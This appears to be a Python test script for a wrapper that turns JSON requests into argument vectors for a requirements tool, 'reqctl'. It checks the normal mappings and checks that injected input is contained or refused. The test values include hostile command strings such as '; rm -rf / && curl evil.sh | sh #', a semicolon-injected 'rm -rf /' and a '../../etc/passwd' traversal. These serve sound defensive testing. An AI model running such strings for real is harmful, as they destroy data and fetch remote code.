#!/usr/bin/env python3
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import corpus_write

faults = []


def argv(name, step, wanted, minted=()):
    try:
        held = corpus_write.argv(step, list(minted))
    except corpus_write.Refused as refused:
        held = f"refused: {refused}"
    if held != wanted:
        faults.append(f"{name}: wanted {wanted!r}, got {held!r}")


def refused(name, step, wanted, minted=()):
    try:
        held = corpus_write.argv(step, list(minted))
        faults.append(f"{name}: allowed {held!r}")
    except corpus_write.Refused as broken:
        if wanted not in str(broken):
            faults.append(f"{name}: wanted {wanted!r}, refused with {broken}")


argv("a revision becomes an argument vector",
     {"command": "revise", "args": ["REQ-11500378"],
      "options": {"status": "deprecated"}},
     ["reqctl", "--json", "revise", "REQ-11500378", "--status=deprecated"])

argv("a relation carries three bare words",
     {"command": "relate", "args": ["REQ-1", "derives_from", "REQ-2"]},
     ["reqctl", "--json", "relate", "REQ-1", "derives_from", "REQ-2"])

argv("a repeated flag repeats",
     {"command": "new", "args": ["requirement"],
      "options": {"criterion": ["a | b | c", "d | e | f"]}},
     ["reqctl", "--json", "new", "requirement",
      "--criterion=a | b | c", "--criterion=d | e | f"])

argv("a flag with no value carries none",
     {"command": "revise", "args": ["REQ-1"], "options": {"no-rationale": None}},
     ["reqctl", "--json", "revise", "REQ-1", "--no-rationale"])

argv("shell metacharacters stay inside one argument",
     {"command": "revise", "args": ["REQ-1"],
      "options": {"text": "; rm -rf / && curl evil.sh | sh #"}},
     ["reqctl", "--json", "revise", "REQ-1",
      "--text=; rm -rf / && curl evil.sh | sh #"])

argv("a value opening with a dash cannot become a flag",
     {"command": "revise", "args": ["REQ-1"], "options": {"text": "--status=approved"}},
     ["reqctl", "--json", "revise", "REQ-1", "--text=--status=approved"])

argv("a newline cannot open a second argument",
     {"command": "revise", "args": ["REQ-1"], "options": {"text": "a\n--status=approved"}},
     ["reqctl", "--json", "revise", "REQ-1", "--text=a\n--status=approved"])

argv("a minted uid is substituted",
     {"command": "relate", "args": ["$0", "derives_from", "REQ-2"]},
     ["reqctl", "--json", "relate", "REQ-9", "derives_from", "REQ-2"],
     minted=["REQ-9"])

refused("an unknown command is refused", {"command": "export"}, "not one of")
refused("a baseline is not dispatched; the workflow settles it",
        {"command": "baseline", "options": {"generate": None}}, "not one of")
refused("a shell is not a command", {"command": "sh"}, "not one of")
refused("an absent command is refused", {}, "not one of")
refused("a flag smuggled as a positional is refused",
        {"command": "delete", "args": ["--help"]}, "not a bare word")
refused("a positional carrying a semicolon is refused",
        {"command": "delete", "args": ["REQ-1; rm -rf /"]}, "not a bare word")
refused("a positional carrying a path is refused",
        {"command": "delete", "args": ["../../etc/passwd"]}, "not a bare word")
refused("a flag name that is not one is refused",
        {"command": "revise", "args": ["REQ-1"], "options": {"text; rm": "x"}},
        "not a flag")
refused("a flag name opening with a dash is refused",
        {"command": "revise", "args": ["REQ-1"], "options": {"-text": "x"}},
        "not a flag")
refused("a value that is not a string is refused",
        {"command": "revise", "args": ["REQ-1"], "options": {"text": {"a": 1}}},
        "is not a string")
refused("a positional that is not a string is refused",
        {"command": "delete", "args": [7]}, "an argument is a string")
refused("options that are not a mapping are refused",
        {"command": "delete", "args": ["REQ-1"], "options": ["text"]},
        "options is a mapping")
refused("args given as a string is refused",
        {"command": "delete", "args": "help"}, "args is a list")
refused("args given as a mapping is refused",
        {"command": "delete", "args": {"REQ-1": "x"}}, "args is a list")
refused("an option given an empty list is refused",
        {"command": "new", "args": ["requirement"], "options": {"criterion": []}},
        "would vanish")

refused("a uid from a step that has not run is refused",
        {"command": "relate", "args": ["$3", "derives_from", "REQ-2"]},
        "has not run")
refused("a uid from a step that minted nothing is refused",
        {"command": "relate", "args": ["$0", "derives_from", "REQ-2"]},
        "minted nothing", minted=[""])


def applied(name, payload, wanted, mints=()):
    seen = []
    minting = list(mints)

    def ran(made, root):
        seen.append(made)
        return {"uid": minting.pop(0)} if minting else {}

    try:
        corpus_write.apply(payload, ".", ran=ran)
    except corpus_write.Refused as refused_by:
        if wanted not in str(refused_by):
            faults.append(f"{name}: refused with {refused_by}")
        return seen
    if wanted:
        faults.append(f"{name}: expected {wanted!r}, ran {seen!r}")
    return seen


applied("no steps is refused", {"steps": []}, "names no steps")
applied("steps that are not a list is refused", {"steps": "revise"}, "names no steps")
applied("a step that is not a mapping is refused",
        {"steps": ["revise"]}, "a step is a mapping")

ran = applied("a failing step stops the ones after it",
              {"steps": [{"command": "revise", "args": ["REQ-1"]},
                         {"command": "sh"},
                         {"command": "delete", "args": ["REQ-2"]}]},
              "not one of")
if len(ran) != 1:
    faults.append(f"a failing step stops the ones after it: ran {ran!r}")

ran = applied("a minted uid reaches the step after it",
              {"steps": [{"command": "new", "args": ["requirement"]},
                         {"command": "relate",
                          "args": ["$0", "derives_from", "REQ-2"]}]},
              "", mints=["REQ-77"])
if ran[-1][-3:] != ["REQ-77", "derives_from", "REQ-2"]:
    faults.append(f"a minted uid reaches the step after it: {ran!r}")

PORTAL = {
    "deprecate": ({"command": "revise", "args": ["REQ-11500378"],
                   "options": {"status": "deprecated"}},
                  ["reqctl", "--json", "revise", "REQ-11500378",
                   "--status=deprecated"]),
    "relate": ({"command": "relate",
                "args": ["REQ-11500378", "derives_from", "REQ-22376970"]},
               ["reqctl", "--json", "relate", "REQ-11500378", "derives_from",
                "REQ-22376970"]),
    "revise": ({"command": "revise", "args": ["REQ-11500378"],
                "options": {"text": "The product shall x.", "priority": "high"}},
               ["reqctl", "--json", "revise", "REQ-11500378",
                "--text=The product shall x.", "--priority=high"]),
    "new term": ({"command": "new", "args": ["term"],
                  "options": {"term": "widget", "definition": "A thing.",
                              "alias": ["widgets", "widgetry"]}},
                 ["reqctl", "--json", "new", "term", "--term=widget",
                  "--definition=A thing.", "--alias=widgets",
                  "--alias=widgetry"]),
    "new parameter": ({"command": "new", "args": ["parameter"],
                       "options": {"text": "How long.", "name": "grace",
                                   "value": "30", "value-type": "duration"}},
                      ["reqctl", "--json", "new", "parameter",
                       "--text=How long.", "--name=grace", "--value=30",
                       "--value-type=duration"]),
    "new data": ({"command": "new", "args": ["data"],
                  "options": {"name": "mail", "text": "Outbound mail."}},
                 ["reqctl", "--json", "new", "data", "--name=mail",
                  "--text=Outbound mail."]),
    "edit a member": ({"command": "revise", "args": ["DATA-23361271"],
                       "options": {"entry": "acme_build",
                                   "set": ["provider=${DATA-1.acme}",
                                           "stage=deployed"]}},
                      ["reqctl", "--json", "revise", "DATA-23361271",
                       "--entry=acme_build", "--set=provider=${DATA-1.acme}",
                       "--set=stage=deployed"]),
    "add a member": ({"command": "revise", "args": ["DATA-23361271"],
                      "options": {"new-entry": "globex",
                                  "set": ["stage=candidate"]}},
                     ["reqctl", "--json", "revise", "DATA-23361271",
                      "--new-entry=globex", "--set=stage=candidate"]),
    "drop a member": ({"command": "revise", "args": ["DATA-23361271"],
                       "options": {"drop-entry": "acme_build"}},
                      ["reqctl", "--json", "revise", "DATA-23361271",
                       "--drop-entry=acme_build"]),
    "revise a term": ({"command": "revise", "args": ["TERM-54403776"],
                       "options": {"definition": "A new wording."}},
                      ["reqctl", "--json", "revise", "TERM-54403776",
                       "--definition=A new wording."]),
    "new": ({"command": "new", "args": ["requirement"],
             "options": {"text": "The product shall y.", "type": "functional",
                         "criterion": ["a | b | c", "d | e | f"]}},
            ["reqctl", "--json", "new", "requirement",
             "--text=The product shall y.", "--type=functional",
             "--criterion=a | b | c", "--criterion=d | e | f"]),
}

for shape, (step, wanted) in PORTAL.items():
    argv(f"the portal's {shape} reaches reqctl unchanged", step, wanted)

if faults:
    print("\n".join(faults))
    sys.exit(1)
sys.exit(0)
